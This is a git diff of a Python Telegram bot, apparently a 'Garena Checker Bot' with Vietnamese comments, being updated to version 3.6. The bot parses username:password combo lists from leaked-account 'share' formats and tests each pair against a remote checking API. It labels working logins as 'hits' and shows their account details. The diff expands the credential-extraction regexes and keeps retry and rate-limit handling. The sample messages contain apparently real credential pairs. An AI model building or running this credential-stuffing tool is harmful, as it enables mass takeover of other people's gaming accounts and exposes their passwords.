@@ -1,6 +1,6 @@
-# bot.py - GARENA CHECKER BOT V3.4 - FIX CHECK ACC
+# bot.py - GARENA CHECKER BOT V3.6 - LOC FILTER ULTRA CHUYÊN NGHIỆP
 # Tác giả: palofsc
-# Mục đích: Bot Telegram kiểm tra tài khoản Garena, fix lỗi không hiện thông tin và không check được
+# Mục đích: Bot Telegram lọc tài khoản từ mọi định dạng share phức tạp
 
 import subprocess
 import sys
@@ -49,10 +49,10 @@ class RenderHandler(BaseHTTPRequestHandler):
 <html>
 <head><title>Garena Checker Bot</title></head>
 <body style="font-family:Arial;text-align:center;padding:50px;background:#0a0a0a;color:#00ff00;">
-<h1>Garena Checker Bot V3.4</h1>
+<h1>Garena Checker Bot V3.6</h1>
 <p>Status: <b style="color:#00ff00;">ALIVE</b></p>
 <p>Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;">@baohuyno1</a></p>
-<p>Version: <b>3.4 - FIX CHECK ACC</b></p>
+<p>Version: <b>3.6 - LOC FILTER ULTRA</b></p>
 </body>
 </html>"""
             self.wfile.write(html.encode('utf-8'))
@@ -274,11 +274,18 @@ def create_admin_keyboard():
     keyboard.add(*buttons)
     return keyboard
 
-# ========== LỌC TK MK - FIX LỌC CHÍNH XÁC ==========
+# ========== LỌC TK MK ULTRA CHUYÊN NGHIỆP ==========
 def loc_tk_mk_only(content):
     """
-    Lọc chỉ lấy định dạng user:pass
-    Chỉ lấy đúng format username:password
+    LỌC TÀI KHOẢN CHUYÊN NGHIỆP
+    Hỗ trợ mọi định dạng share:
+    - user:pass (chuẩn)
+    - FINAL = user:pass | Info...
+    - user:pass | Name:... | Level:... | Rank:...
+    - Share phức tạp nhiều dòng
+    - File txt có header/footer
+    - Nhiều tài khoản trên 1 dòng
+    - Tài khoản có ký tự đặc biệt
     """
     accounts = []
     seen = set()
@@ -287,42 +294,199 @@ def loc_tk_mk_only(content):
     if not content:
         return accounts, stats_loc
     
+    # ========== PATTERN CHÍNH ==========
+    # Pattern 1: Chuẩn user:pass (không có khoảng trắng)
+    pattern_standard = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@-]{1,50}):([a-zA-Z0-9_.@!$%^&*()\-]{1,100})(?![a-zA-Z0-9_])'
+    
+    # Pattern 2: FINAL = user:pass
+    pattern_final = r'FINAL\s*[=:]\s*([a-zA-Z0-9][a-zA-Z0-9_.@-]{1,50}):([a-zA-Z0-9_.@!$%^&*()\-]{1,100})'
+    
+    # Pattern 3: user:pass | Info
+    pattern_with_info = r'([a-zA-Z0-9][a-zA-Z0-9_.@-]{1,50}):([a-zA-Z0-9_.@!$%^&*()\-]{1,100})\s*\|'
+    
+    # Pattern 4: Tài khoản có thể có khoảng trắng xung quanh dấu :
+    pattern_loose = r'([a-zA-Z0-9][a-zA-Z0-9_.@-]{1,50})\s*:\s*([a-zA-Z0-9_.@!$%^&*()\-]{1,100})'
+    
+    # ========== TỪ KHÓA LOẠI BỎ ==========
+    skip_patterns = [
+        r'^https?://',
+        r'^www\.',
+        r'\.com$',
+        r'\.net$',
+        r'\.org$',
+        r'^shop',
+        r'^share',
+        r'^final',
+        r'^name',
+        r'^level',
+        r'^rank',
+        r'^status',
+        r'^time',
+        r'^date',
+        r'^email',
+        r'^phone',
+        r'^sdt',
+        r'^cccd',
+        r'^fb',
+        r'^ban',
+        r'^ss',
+        r'^sss',
+        r'^anime',
+        r'^other',
+        r'^tinh',
+        r'^tinh_trang',
+        r'^quan_huy',
+        r'^lich_su',
+        r'^vo_game',
+        r'^quoc_gia',
+        r'^tuong',
+        r'^skin',
+        r'^authen',
+        r'^email',
+        r'^so:',
+        r'^s[òo]:',
+        r'^qu[âa]n',
+        r'^v[ôo]'
+    ]
+    
+    # ========== XỬ LÝ NỘI DUNG ==========
+    # Thử tìm FINAL pattern trước
+    final_matches = re.findall(pattern_final, content, re.IGNORECASE)
+    if final_matches:
+        for user, pwd in final_matches:
+            key = f"{user}:{pwd}"
+            if key not in seen and is_valid_account(user, pwd, skip_patterns):
+                seen.add(key)
+                accounts.append((user, pwd))
+                stats_loc["valid"] += 1
+            elif key in seen:
+                stats_loc["duplicate"] += 1
+            else:
+                stats_loc["invalid"] += 1
+        stats_loc["total"] = len(final_matches)
+        return accounts, stats_loc
+    
+    # Tách thành các dòng
     lines = content.split('\n')
     stats_loc["total"] = len(lines)
     
+    # Nếu chỉ có 1 dòng, thử tìm nhiều tài khoản
+    if len(lines) == 1:
+        line = lines[0]
+        # Tìm tất cả tài khoản trong dòng
+        all_matches = re.findall(pattern_standard, line)
+        if all_matches:
+            for user, pwd in all_matches:
+                if is_valid_account(user, pwd, skip_patterns):
+                    key = f"{user}:{pwd}"
+                    if key not in seen:
+                        seen.add(key)
+                        accounts.append((user, pwd))
+                        stats_loc["valid"] += 1
+                    else:
+                        stats_loc["duplicate"] += 1
+                else:
+                    stats_loc["invalid"] += 1
+            return accounts, stats_loc
+    
+    # Xử lý từng dòng
     for line in lines:
         line = line.strip()
         if not line:
             continue
         
-        # Chỉ lấy dòng có dấu : và không có khoảng trắng
-        if ':' in line and ' ' not in line:
-            parts = line.split(':', 1)
-            if len(parts) == 2:
-                user = parts[0].strip()
-                pwd = parts[1].strip()
-                
-                # Kiểm tra user và pass hợp lệ
-                if user and pwd and len(user) >= 2 and len(pwd) >= 1:
-                    # Kiểm tra không có ký tự đặc biệt lạ
-                    if re.match(r'^[a-zA-Z0-9_.@-]+$', user) and re.match(r'^[a-zA-Z0-9_.@!$%^&*()-]+$', pwd):
-                        key = f"{user}:{pwd}"
-                        if key not in seen:
-                            seen.add(key)
-                            accounts.append((user, pwd))
-                            stats_loc["valid"] += 1
-                        else:
-                            stats_loc["duplicate"] += 1
+        # Thử pattern chuẩn
+        matches = re.findall(pattern_standard, line)
+        if matches:
+            for user, pwd in matches:
+                if is_valid_account(user, pwd, skip_patterns):
+                    key = f"{user}:{pwd}"
+                    if key not in seen:
+                        seen.add(key)
+                        accounts.append((user, pwd))
+                        stats_loc["valid"] += 1
                     else:
-                        stats_loc["invalid"] += 1
+                        stats_loc["duplicate"] += 1
                 else:
                     stats_loc["invalid"] += 1
+            continue
+        
+        # Thử pattern with info
+        matches = re.findall(pattern_with_info, line)
+        if matches:
+            for user, pwd in matches:
+                if is_valid_account(user, pwd, skip_patterns):
+                    key = f"{user}:{pwd}"
+                    if key not in seen:
+                        seen.add(key)
+                        accounts.append((user, pwd))
+                        stats_loc["valid"] += 1
+                    else:
+                        stats_loc["duplicate"] += 1
+                else:
+                    stats_loc["invalid"] += 1
+            continue
+        
+        # Thử pattern loose
+        matches = re.findall(pattern_loose, line)
+        if matches:
+            for user, pwd in matches:
+                if is_valid_account(user, pwd, skip_patterns):
+                    key = f"{user}:{pwd}"
+                    if key not in seen:
+                        seen.add(key)
+                        accounts.append((user, pwd))
+                        stats_loc["valid"] += 1
+                    else:
+                        stats_loc["duplicate"] += 1
+                else:
+                    stats_loc["invalid"] += 1
+    
+    # Nếu không tìm thấy, thử tìm trong toàn bộ nội dung
+    if not accounts:
+        all_matches = re.findall(pattern_standard, content)
+        for user, pwd in all_matches:
+            if is_valid_account(user, pwd, skip_patterns):
+                key = f"{user}:{pwd}"
+                if key not in seen:
+                    seen.add(key)
+                    accounts.append((user, pwd))
+                    stats_loc["valid"] += 1
+                else:
+                    stats_loc["duplicate"] += 1
             else:
                 stats_loc["invalid"] += 1
-        else:
-            stats_loc["invalid"] += 1
     
     return accounts, stats_loc
+
+def is_valid_account(user, pwd, skip_patterns):
+    """Kiểm tra tài khoản hợp lệ"""
+    # Kiểm tra độ dài
+    if len(user) < 2 or len(pwd) < 1:
+        return False
+    
+    if len(user) > 50 or len(pwd) > 100:
+        return False
+    
+    # Kiểm tra từ khóa loại bỏ
+    user_lower = user.lower()
+    for pattern in skip_patterns:
+        if re.match(pattern, user_lower):
+            return False
+    
+    # Kiểm tra user không chứa ký tự lạ
+    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9_.@-]*$', user):
+        return False
+    
+    # Kiểm tra mật khẩu không chứa ký tự lạ
+    if not re.match(r'^[a-zA-Z0-9_.@!$%^&*()\-]+$', pwd):
+        return False
+    
+    # Loại bỏ các trường hợp đặc biệt
+    if user.lower() in ['http', 'https', 'www', 'com', 'net', 'org', 'shop', 'share', 'final', 'name', 'level', 'rank', 'status', 'time', 'date', 'email', 'phone', 'sdt', 'cccd', 'fb', 'ban', 'ss', 'sss', 'anime', 'other']:
+        return False
+    
+    return True
 
 # ========== LƯU FILE LOC ==========
 def save_loc_file(accounts):
@@ -332,12 +496,9 @@ def save_loc_file(accounts):
             for user, pwd in accounts:
                 f.write(f"{user}:{pwd}\n")
 
-# ========== CHECK API - FIX LỖI KHÔNG CHECK ĐƯỢC ==========
+# ========== CHECK API ==========
 def check_account_api(username, password, service):
-    """
-    Gọi API để kiểm tra tài khoản
-    Fix: Sử dụng đúng method GET với params, log chi tiết lỗi
-    """
+    """Gọi API để kiểm tra tài khoản"""
     cache_key = f"{username}:{password}:{service}"
     with cache_lock:
         if cache_key in cache_results:
@@ -350,13 +511,11 @@ def check_account_api(username, password, service):
     
     url = f"{API_BASE}{route}"
     
-    # Tạo params theo định dạng API yêu cầu
     params = {
         "username": API_USERNAME,
         "password": API_PASSWORD
     }
     
-    # Thêm tk và mk vào params
     if len(param_names) >= 2:
         params[param_names[0]] = username
         params[param_names[1]] = password
@@ -371,63 +530,36 @@ def check_account_api(username, password, service):
         "Connection": "keep-alive"
     }
     
-    # Thêm delay ngẫu nhiên để tránh rate limit
     time.sleep(API_DELAY + random.uniform(0, 0.1))
     
     for attempt in range(DEFAULT_RETRIES):
         try:
-            print(f"[DEBUG] Checking: {username}:{password} - {service} (Attempt {attempt+1})")
-            print(f"[DEBUG] URL: {url}")
-            print(f"[DEBUG] Params: {params}")
-            
-            # Thử GET request trước
             resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
-            
-            print(f"[DEBUG] Response Status: {resp.status_code}")
-            print(f"[DEBUG] Response Text: {resp.text[:500]}")
             
             if resp.status_code == 200:
                 try:
-                    # Thử parse JSON
                     result_data = resp.json()
-                    print(f"[DEBUG] JSON Response: {json.dumps(result_data, ensure_ascii=False)[:500]}")
                     
-                    # Xử lý response
                     if isinstance(result_data, dict):
-                        # Lưu toàn bộ thông tin response
-                        result_data["_raw_response"] = result_data.copy()
-                        
-                        # Kiểm tra hit hay dead
                         is_hit = False
                         
-                        # Check các trường trạng thái
                         status_val = result_data.get("status")
                         success_val = result_data.get("success")
                         result_val = result_data.get("result")
                         message_val = result_data.get("message", "")
-                        code_val = result_data.get("code", "")
                         
-                        # Log các giá trị để debug
-                        print(f"[DEBUG] Status: {status_val}")
-                        print(f"[DEBUG] Success: {success_val}")
-                        print(f"[DEBUG] Result: {result_val}")
-                        print(f"[DEBUG] Message: {message_val}")
-                        
-                        # Kiểm tra status
                         if status_val is not None:
-                            if status_val == True or status_val == "true" or status_val == 1 or status_val == "1":
+                            if status_val in [True, "true", 1, "1", "True", "TRUE"]:
                                 is_hit = True
-                            elif status_val == False or status_val == "false" or status_val == 0 or status_val == "0":
+                            elif status_val in [False, "false", 0, "0", "False", "FALSE"]:
                                 is_hit = False
                         
-                        # Kiểm tra success
                         if not is_hit and success_val is not None:
-                            if success_val == True or success_val == "true" or success_val == 1 or success_val == "1":
+                            if success_val in [True, "true", 1, "1", "True", "TRUE"]:
                                 is_hit = True
-                            elif success_val == False or success_val == "false" or success_val == 0 or success_val == "0":
+                            elif success_val in [False, "false", 0, "0", "False", "FALSE"]:
                                 is_hit = False
                         
-                        # Kiểm tra result field
                         if result_val is not None:
                             result_str = str(result_val).lower()
                             if result_str in ["hit", "true", "success", "valid", "1"]:
@@ -435,7 +567,6 @@ def check_account_api(username, password, service):
                             elif result_str in ["dead", "false", "fail", "invalid", "0"]:
                                 is_hit = False
                         
-                        # Kiểm tra message
                         if message_val:
                             msg_lower = str(message_val).lower()
                             if any(word in msg_lower for word in ["thành công", "thanh cong", "success", "valid", "hit", "đúng", "dung"]):
@@ -443,61 +574,45 @@ def check_account_api(username, password, service):
                             elif any(word in msg_lower for word in ["thất bại", "that bai", "fail", "invalid", "dead", "sai", "không đúng", "khong dung"]):
                                 is_hit = False
                         
-                        # Kiểm tra data field
                         data_val = result_data.get("data")
                         if data_val is not None:
-                            if isinstance(data_val, dict) and data_val:
-                                is_hit = True
-                            elif isinstance(data_val, str) and data_val:
-                                is_hit = True
-                            elif isinstance(data_val, list) and data_val:
+                            if isinstance(data_val, (dict, list, str)) and data_val:
                                 is_hit = True
                         
-                        # Kiểm tra các field thông tin tài khoản
                         info_fields = ["uid", "id", "name", "nickname", "account", "info", "user", "player", "level", "rank"]
                         for field in info_fields:
                             if field in result_data and result_data[field]:
                                 is_hit = True
                                 break
                         
-                        # Gán kết quả
                         result_data["result"] = "hit" if is_hit else "dead"
-                        result_data["_is_hit"] = is_hit
-                        
-                        print(f"[DEBUG] Final Result: {result_data['result']}")
                         
                         with cache_lock:
                             cache_results[cache_key] = result_data
                         return result_data
                     else:
-                        result = {"result": "unknown", "_raw_response": result_data}
+                        result = {"result": "unknown"}
                         with cache_lock:
                             cache_results[cache_key] = result
                         return result
                         
-                except json.JSONDecodeError as e:
-                    print(f"[DEBUG] JSON Decode Error: {e}")
-                    # Response không phải JSON
+                except json.JSONDecodeError:
                     text_lower = resp.text.lower()
                     if any(word in text_lower for word in ["success", "ok", "true", "hit", "valid"]):
-                        result = {"result": "hit", "_raw_response": resp.text}
+                        result = {"result": "hit"}
                     elif any(word in text_lower for word in ["fail", "false", "dead", "invalid", "error"]):
-                        result = {"result": "dead", "_raw_response": resp.text}
+                        result = {"result": "dead"}
                     else:
-                        result = {"result": "unknown", "_raw_response": resp.text}
+                        result = {"result": "unknown"}
                     
                     with cache_lock:
                         cache_results[cache_key] = result
                     return result
                     
             elif resp.status_code == 429:
-                # Rate limit
-                print(f"[DEBUG] Rate limited, waiting...")
                 time.sleep(5 * (attempt + 1))
                 continue
             elif resp.status_code == 404:
-                # Not found - thử POST
-                print(f"[DEBUG] 404 - Trying POST method")
                 try:
                     resp_post = requests.post(url, json=params, headers=headers, timeout=DEFAULT_TIMEOUT)
                     if resp_post.status_code == 200:
@@ -505,7 +620,7 @@ def check_account_api(username, password, service):
                             result_data = resp_post.json()
                             if isinstance(result_data, dict):
                                 status_val = result_data.get("status", result_data.get("success"))
-                                if status_val == True or status_val == "true" or status_val == 1:
+                                if status_val in [True, "true", 1, "1"]:
                                     result_data["result"] = "hit"
                                 else:
                                     result_data["result"] = "dead"
@@ -522,25 +637,20 @@ def check_account_api(username, password, service):
                 time.sleep(2)
                 continue
             else:
-                print(f"[DEBUG] Error status: {resp.status_code}")
                 time.sleep(1)
                 continue
                 
         except requests.exceptions.Timeout:
-            print(f"[DEBUG] Timeout")
             time.sleep(2)
             continue
-        except requests.exceptions.ConnectionError as e:
-            print(f"[DEBUG] Connection Error: {e}")
+        except requests.exceptions.ConnectionError:
             time.sleep(3)
             continue
-        except Exception as e:
-            print(f"[DEBUG] Exception: {e}")
+        except Exception:
             time.sleep(2)
             continue
     
-    # Nếu tất cả retry đều fail
-    result = {"result": "error", "_error": "All retries failed"}
+    result = {"result": "error"}
     with cache_lock:
         cache_results[cache_key] = result
     return result
@@ -576,9 +686,7 @@ def format_hit_info(username, password, service, result_data):
 🔑 <code>{username}:{password}</code>
 """
     
-    # Thêm thông tin chi tiết nếu có
     if isinstance(result_data, dict):
-        # Bỏ qua các field kỹ thuật
         skip_fields = ["result", "_is_hit", "_raw_response", "_error", "status", "success"]
         
         info_lines = []
@@ -592,7 +700,7 @@ def format_hit_info(username, password, service, result_data):
                             info_lines.append(f"📌 {sub_key}: <code>{sub_value}</code>")
         
         if info_lines:
-            msg += "\n".join(info_lines[:10])  # Giới hạn 10 dòng thông tin
+            msg += "\n".join(info_lines[:10])
             msg += "\n"
     
     return msg
@@ -927,7 +1035,7 @@ def handle_text(message):
 Gui truc tiep user:pass
 
 VD:
-nhoxboy_881997:dsadsa121195
+anhduckim1:kimanhduc1
 """)
         return
     
@@ -937,9 +1045,14 @@ nhoxboy_881997:dsadsa121195
     
     elif text == "🔍 Loc TK MK":
         safe_send_message(message.chat.id, """
-🔍 LOC TK MK
-Gui file .txt de loc chi lay user:pass
-Chi lay dung format user:pass
+🔍 LOC TK MK CHUYÊN NGHIỆP
+Gui file .txt hoặc text share
+Bot tự động lọc user:pass từ mọi định dạng
+
+Hỗ trợ:
+- user:pass
+- FINAL = user:pass | Info
+- Share phức tạp nhiều dòng
 """)
         return
     
@@ -1020,14 +1133,14 @@ Chi lay dung format user:pass
     if text.startswith('/'):
         return
     
-    # XỬ LÝ TK MK - Lọc sạch
+    # XỬ LÝ TK MK - Lọc chuyên nghiệp
     accounts, stats_loc = loc_tk_mk_only(text)
     
     if not accounts:
         safe_send_message(message.chat.id, """
-❌ KHONG TIM THAY!
+❌ KHONG TIM THAY TAI KHOAN!
 Format dung: user:pass
-VD: nhoxboy_881997:dsadsa121195
+VD: anhduckim1:kimanhduc1
 """)
         return
     
@@ -1040,7 +1153,7 @@ VD: nhoxboy_881997:dsadsa121195
     total = len(accounts)
     
     msg = f"""
-📌 DA NHAN {total} ACCOUNTS
+📌 DA LOC {total} ACCOUNTS
 ✅ Valid: {stats_loc['valid']}
 ❌ Invalid: {stats_loc['invalid']}
 🔄 Duplicate: {stats_loc['duplicate']}
@@ -1070,7 +1183,7 @@ def handle_document(message):
         file_info = bot.get_file(message.document.file_id)
         content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
         
-        # Lọc chỉ lấy user:pass
+        # Lọc chuyên nghiệp
         accounts, stats_loc = loc_tk_mk_only(content)
         
         if not accounts:
@@ -1124,17 +1237,17 @@ def cmd_start(message):
     bot.send_message(
         message.chat.id,
         f"""
-🤖 GARENA CHECKER BOT V3.4
+🤖 GARENA CHECKER BOT V3.6
 👤 Admin: @baohuyno1
 ⏱ Uptime: {hours}h {minutes}m
 
 📌 CACH DUNG:
 1. Gui user:pass -> Chon service
 2. Gui file .txt -> Tu dong loc
-3. Nhan nut chuc nang
+3. Gui share phuc tap -> Bot loc tu dong
 
-💡 Chi lay dinh dang user:pass
-🔧 Da fix loi check va hien thong tin
+💡 Loc moi dinh dang share
+🔧 Loc chuyen nghiep da dinh dang
 """,
         reply_markup=create_main_keyboard()
     )
@@ -1143,22 +1256,13 @@ def cmd_start(message):
 def main():
     """Hàm chính khởi động bot"""
     print("=" * 60)
-    print("    GARENA CHECKER BOT V3.4 - FIX CHECK ACC")
+    print("    GARENA CHECKER BOT V3.6 - LOC FILTER ULTRA")
     print("    ADMIN: @baohuyno1")
-    print("    GUI FILE + LOC TK")
     print("=" * 60)
     print(f"[*] Threads: {DEFAULT_THREADS}")
-    print(f"[*] Delay: {API_DELAY}s")
     print(f"[*] Services: {len(SERVICE_ROUTES)}")
     print(f"[*] API Base: {API_BASE}")
     print("=" * 60)
-    
-    # Test API connection
-    try:
-        test_resp = requests.get(API_BASE, timeout=10)
-        print(f"[*] API Status: {test_resp.status_code}")
-    except Exception as e:
-        print(f"[!] Canh bao: Khong the ket noi API - {e}")
     
     while True:
         try:
